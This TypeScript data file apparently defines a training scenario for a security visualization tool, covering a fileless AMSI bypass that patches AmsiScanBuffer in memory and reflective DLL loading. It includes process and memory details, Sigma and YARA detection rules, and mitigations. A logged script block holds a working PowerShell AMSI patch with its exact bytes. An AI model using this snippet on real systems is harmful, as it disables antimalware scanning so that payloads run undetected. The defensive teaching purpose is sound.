import { AttackScenario } from './types';

export const AMSI_REFLECTIVE_DLL_SCENARIO: AttackScenario = {
  id: 'amsi-reflective-dll',
  code: 'T1562.001',
  name: 'Fileless AMSI Memory Bypass & Reflective DLL Injection',
  shortSubtitle: 'Malware Analysis · Patching amsi.dll in Memory & Reflective Loader',
  category: 'MALWARE',
  severity: 'CRITICAL',
  primaryMitrePhase: 4,
  overview: 'Fileless malware evades Windows Antimalware Scan Interface (AMSI) by locating amsi.dll!AmsiScanBuffer inside the current powershell.exe address space, changing page permissions via VirtualProtect, and overwriting the function prologue with 6 bytes (mov eax, 0x80070057; ret) so every scan immediately returns E_INVALIDARG. It then loads a C2 agent DLL directly from a byte array in memory using Reflective DLL Injection without ever touching the disk.',
  specs: [
    { term: 'MITRE TECHNIQUES', value: 'T1562.001 (AMSI Bypass) · T1620 (Reflective Code Loading)' },
    { term: 'PATCH TARGET', value: 'amsi.dll!AmsiScanBuffer (6-Byte Prologue Patch)' },
    { term: 'PATCH OPCODES', value: 'B8 57 00 07 80 C3 (mov eax, 0x80070057 ; ret)' },
    { term: 'DETECTION LOGS', value: 'PowerShell Event ID 4104 (ScriptBlock), Sysmon EID 7, ETW AMSI' },
  ],
  nodes: [
    {
      id: 'ps_stager',
      label: 'powershell.exe',
      sublabel: 'PID 6120 (Fileless)',
      role: 'process',
      x: 20,
      y: 52,
      details: {
        osOrType: 'Windows PowerShell v5.1',
        pidOrPort: 'PID 6120 · -nop -w hidden',
        privilege: 'High Integrity',
        artifacts: ['Event ID 4104 ScriptBlock Logged', 'P/Invoke GetProcAddress("AmsiScanBuffer")'],
        description: 'PowerShell host process running an in-memory stager that dynamically resolves Win32 APIs via .NET Reflection.' } },
    {
      id: 'amsi_dll',
      label: 'amsi.dll (In-Memory)',
      sublabel: '0x7FF91A042480',
      role: 'memory',
      x: 50,
      y: 28,
      details: {
        osOrType: 'Antimalware Scan Interface DLL',
        pidOrPort: 'Export: AmsiScanBuffer',
        privilege: 'User-Mode Hook (Patched)',
        artifacts: ['Original: 4C 8B DC 49 89 5B 08', 'Patched: B8 57 00 07 80 C3'],
        description: 'User-mode AMSI DLL mapped inside powershell.exe whose AmsiScanBuffer export is overwritten to force scan failure.' } },
    {
      id: 'reflective_heap',
      label: 'Reflective PE Heap',
      sublabel: '0x024A80000 (RWX)',
      role: 'memory',
      x: 56,
      y: 68,
      details: {
        osOrType: 'In-Memory Reflective Loader',
        pidOrPort: 'Export: ReflectiveLoader()',
        privilege: 'Unbacked Private Commit',
        artifacts: ['Manual IAT Resolution', 'Base Relocation Table Applied', 'DllMain(DLL_PROCESS_ATTACH)'],
        description: 'Private heap allocation where the downloaded DLL maps its own sections, resolves imports, fixes relocations, and calls DllMain.' } },
    {
      id: 'siem_pslog',
      label: 'Event 4104 & EDR',
      sublabel: 'ScriptBlock & Memory Scan',
      role: 'firewall_siem',
      x: 84,
      y: 48,
      details: {
        osOrType: 'Windows PowerShell Operational Log + EDR',
        pidOrPort: 'Event ID 4104 + Image Integrity Check',
        privilege: 'SYSTEM Sensor',
        artifacts: ['ScriptBlock Warning Level', 'amsi.dll .text checksum mismatch'],
        description: 'PowerShell Operational Event ID 4104 and EDR memory integrity scanner detecting modified .text bytes in amsi.dll.' } },
  ],
  processTree: [
    {
      pid: 6120,
      ppid: 4100,
      name: 'powershell.exe',
      commandLine: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass',
      user: 'CORP\\admin_reza',
      integrity: 'High',
      status: 'injected',
      activeFromStage: 1,
      apiCalls: [
        'LoadLibrary("amsi.dll")',
        'GetProcAddress("AmsiScanBuffer")',
        'VirtualProtect(0x7FF91A042480, 6, PAGE_EXECUTE_READWRITE)',
        'Marshal.Copy(patchBytes, 0, addr, 6)',
        '[System.Reflection.Assembly]::Load(byte[])',
      ],
      memoryBlocks: [
        {
          address: '0x7FF91A042480',
          section: 'amsi.dll (.text)',
          permissions: 'R-X',
          size: '64 KB',
          status: 'patched',
          description: 'First 6 bytes of AmsiScanBuffer overwritten with mov eax, 0x80070057; ret (Copy-on-Write triggered).',
          hexPreview: 'B8 57 00 07 80 C3 90 90 48 89 74 24 18 57 48 83  .W......H.t$.WH.' },
        {
          address: '0x024A80000',
          section: 'Private Heap (Reflective DLL)',
          permissions: 'RWX',
          size: '512 KB',
          status: 'shellcode',
          description: 'Full PE DLL manually mapped in memory by ReflectiveLoader without registering in PEB Ldr module list.',
          hexPreview: '4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............' },
      ] },
  ],
  stages: [
    {
      index: 1,
      title: 'LOCATE AMSISCANBUFFER IN MEMORY',
      subtitle: 'Dynamic P/Invoke resolution captured in PowerShell Event ID 4104',
      description: 'When PowerShell starts, Windows loads amsi.dll into its process space so every script block passes through AmsiScanBuffer(). The attacker uses string concatenation and .NET Reflection to invoke GetProcAddress("amsi.dll", "AmsiScanBuffer"). Before the patch completes, PowerShell Event ID 4104 logs the deobfuscated script block.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1562.001',
      mitreTechniqueName: 'Impair Defenses: Disable or Modify Tools',
      activeNodeIds: ['ps_stager', 'amsi_dll', 'siem_pslog'],
      compromisedNodeIds: ['ps_stager'],
      keySpecs: [
        { term: 'TARGET MODULE', value: 'C:\\Windows\\System32\\amsi.dll' },
        { term: 'TARGET EXPORT', value: 'AmsiScanBuffer (0x7FF91A042480)' },
        { term: 'POWERSHELL LOG', value: 'Event ID 4104 (ScriptBlock Logging)' },
      ] },
    {
      index: 2,
      title: 'PATCH 6 BYTES OF AMSISCANBUFFER PROLOGUE',
      subtitle: 'Overwriting prologue with mov eax, E_INVALIDARG; ret',
      description: 'Because the .text section of amsi.dll is mapped as PAGE_EXECUTE_READ, the script calls VirtualProtect() to make 0x7FF91A042480 writable. It then copies 6 bytes (B8 57 00 07 80 C3) into the function prologue. In x64 assembly, this executes "mov eax, 0x80070057; ret", forcing AmsiScanBuffer to return E_INVALIDARG immediately without scanning any subsequent payload.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1562.001',
      mitreTechniqueName: 'In-Memory API Unhooking / Patching',
      activeNodeIds: ['ps_stager', 'amsi_dll', 'siem_pslog'],
      compromisedNodeIds: ['ps_stager', 'amsi_dll'],
      keySpecs: [
        { term: 'INJECTED OPCODES', value: 'B8 57 00 07 80 C3 (mov eax, 0x80070057 ; ret)' },
        { term: 'MEMORY ARTIFACT', value: 'Copy-on-Write (Private Modified Page in amsi.dll)' },
        { term: 'AMSI RESULT', value: 'AMSI_RESULT_CLEAN / Bypassed' },
      ] },
    {
      index: 3,
      title: 'REFLECTIVE DLL LOADING FROM MEMORY BUFFER',
      subtitle: 'Manual PE mapping in private heap without LoadLibrary on disk',
      description: 'With AMSI blinded, the script downloads an encrypted DLL byte array into memory. Instead of writing to disk and calling LoadLibrary() (which triggers Sysmon EID 7 and AV file scans), the payload executes a custom ReflectiveLoader stub that manually maps PE sections into heap memory (0x024A80000), resolves the Import Address Table (IAT), processes base relocations, and invokes DllMain.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1620',
      mitreTechniqueName: 'Reflective Code Loading',
      activeNodeIds: ['ps_stager', 'reflective_heap', 'siem_pslog'],
      compromisedNodeIds: ['ps_stager', 'amsi_dll', 'reflective_heap'],
      keySpecs: [
        { term: 'HEAP BASE ADDRESS', value: '0x024A80000 (Private Unbacked RWX)' },
        { term: 'EVASION BENEFIT', value: 'Not registered in PEB->Ldr Module List, zero disk footprint' },
        { term: 'BLUE TEAM HUNT', value: 'Scan private memory for MZ/PE magic bytes & Copy-on-Write pages' },
      ] },
  ],
  telemetry: [
    {
      id: 'amsi-1',
      no: 1,
      stageIndex: 1,
      timestamp: '00:00.090',
      sourceNodeId: 'ps_stager',
      targetNodeId: 'siem_pslog',
      sourceLabel: 'powershell.exe (6120)',
      targetLabel: 'WinEvent 4104',
      sourceType: 'WIN_EVENT',
      protocolOrEventId: 'Event ID 4104',
      shortAction: 'SCRIPTBLOCK',
      info: 'Execute a Remote Command: Win32.VirtualProtect & GetProcAddress("AmsiScanBuffer")',
      sizeOrCode: 'Warning',
      severity: 'CRITICAL',
      mitreId: 'T1562.001',
      explanation: 'Event ID 4104 (Microsoft-Windows-PowerShell/Operational) is the gold standard for DFIR analysts. Even when the attacker uses Base64 encoding or string splitting, PowerShell logs the deobfuscated script block right before execution.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"/>
    <EventID>4104</EventID>
    <Level>3</Level>
  </System>
  <EventData>
    <Data Name="MessageNumber">1</Data>
    <Data Name="MessageTotal">1</Data>
    <Data Name="ScriptBlockText">
$addr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "Amsi" + "ScanBuffer")
$p = 0
[Win32]::VirtualProtect($addr, [uint32]6, 0x40, [ref]$p)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
    </Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'AMSI Bypass via VirtualProtect in PowerShell ScriptBlock 4104',
        ruleCode: `title: PowerShell AMSI Bypass via Memory Patching
logsource:
  product: windows
  category: ps_script
detection:
  selection:
    EventID: 4104
    ScriptBlockText|contains|all:
      - 'VirtualProtect'
      - 'Marshal'
      - 'Copy'
  selection_bytes:
    ScriptBlockText|contains:
      - '0xB8, 0x57, 0x00, 0x07, 0x80'
      - 'AmsiScanBuffer'
  condition: selection and selection_bytes
level: critical`,
        mitigation: 'Enforce PowerShell Script Block Logging (Event ID 4104) via Group Policy and enable ConstrainedMode (CLM).' } },
    {
      id: 'amsi-2',
      no: 2,
      stageIndex: 2,
      timestamp: '00:00.140',
      sourceNodeId: 'ps_stager',
      targetNodeId: 'amsi_dll',
      sourceLabel: 'powershell.exe (6120)',
      targetLabel: 'amsi.dll (0x7FF91A042480)',
      sourceType: 'WIN32_API',
      protocolOrEventId: 'Win32 API / Assembly',
      shortAction: 'PATCH 6 BYTES',
      info: 'VirtualProtect(RWX) + Write 0xB857000780C3 to amsi!AmsiScanBuffer',
      sizeOrCode: '6 Bytes',
      severity: 'CRITICAL',
      mitreId: 'T1562.001',
      explanation: 'Comparing the disassembly of amsi!AmsiScanBuffer before and after patching in x64dbg reveals how the prologue is hijacked to immediately return E_INVALIDARG (0x80070057).',
      rawLog: `; === BEFORE PATCH (Clean amsi.dll!AmsiScanBuffer) ===
00007FF91A042480 | 4C:8BDC          | mov r11, rsp
00007FF91A042483 | 49:895B 08       | mov qword ptr ds:[r11+8], rbx
00007FF91A042487 | 49:896B 10       | mov qword ptr ds:[r11+10], rbp

; === AFTER PATCH (Patched by Malware in RAM) ===
00007FF91A042480 | B8 57000780      | mov eax, 80070057   ; E_INVALIDARG
00007FF91A042485 | C3               | ret                 ; Immediate return!
00007FF91A042486 | 1049 89          | adc byte ptr ds:[rcx-77], cl`,
      detectionRule: {
        type: 'YARA',
        title: 'Memory Integrity Scan: Patched AmsiScanBuffer Prologue',
        ruleCode: `rule Memory_AMSI_Bypass_Patch {
  meta:
    description = "Detects classic 6-byte E_INVALIDARG patch in amsi.dll memory"
    mitre = "T1562.001"
  strings:
    $patch_x64 = { B8 57 00 07 80 C3 }
  condition:
    $patch_x64
}`,
        mitigation: 'Use memory forensic tools (Moneta, HollowsHunter, PE-sieve) or EDR to detect DLL code sections whose Working Set page attributes flipped from Shared to Private (Copy-on-Write).' } },
    {
      id: 'amsi-3',
      no: 3,
      stageIndex: 3,
      timestamp: '00:00.510',
      sourceNodeId: 'ps_stager',
      targetNodeId: 'reflective_heap',
      sourceLabel: 'powershell.exe (6120)',
      targetLabel: 'Heap 0x024A80000',
      sourceType: 'MEMORY_SCAN',
      protocolOrEventId: 'PE-sieve / Memory',
      shortAction: 'REFLECTIVE DLL',
      info: 'Unbacked Executable PE Image Detected at 0x024A80000 (512 KB RWX)',
      sizeOrCode: '512 KB',
      severity: 'CRITICAL',
      mitreId: 'T1620',
      explanation: 'Memory forensics scanner (PE-sieve / HollowsHunter) detects a full PE header and executable code sections inside private heap memory at 0x024A80000 with no corresponding file path on disk.',
      rawLog: `[PE-sieve Scan Report - PID 6120 (powershell.exe)]
{
  "pid": 6120,
  "name": "powershell.exe",
  "scans": [
    {
      "module": "7ff91a040000",
      "module_file": "C:\\Windows\\System32\\amsi.dll",
      "status": "PATCHED",
      "patches_count": 1
    },
    {
      "module": "24a80000",
      "status": "IMPLANT_PE",
      "is_executable": true,
      "protection": "PAGE_EXECUTE_READWRITE",
      "mapping_type": "MEM_PRIVATE (Unbacked Reflective DLL)"
    }
  ]
}`,
      detectionRule: {
        type: 'YARA',
        title: 'Stephen Fewer Reflective DLL Loader Stub Detection',
        ruleCode: `rule Reflective_DLL_Loader_Stub {
  meta:
    description = "Detects ReflectiveLoader export and PEB walking shellcode"
    mitre = "T1620"
  strings:
    $exp = "ReflectiveLoader" ascii
    $mz_loop = { 66 81 39 4D 5A 75 }
  condition:
    any of them
}`,
        mitigation: 'Deploy Microsoft Defender ASR rules blocking obfuscated scripts and run automated memory integrity sweeps with PE-sieve.' } },
  ] };
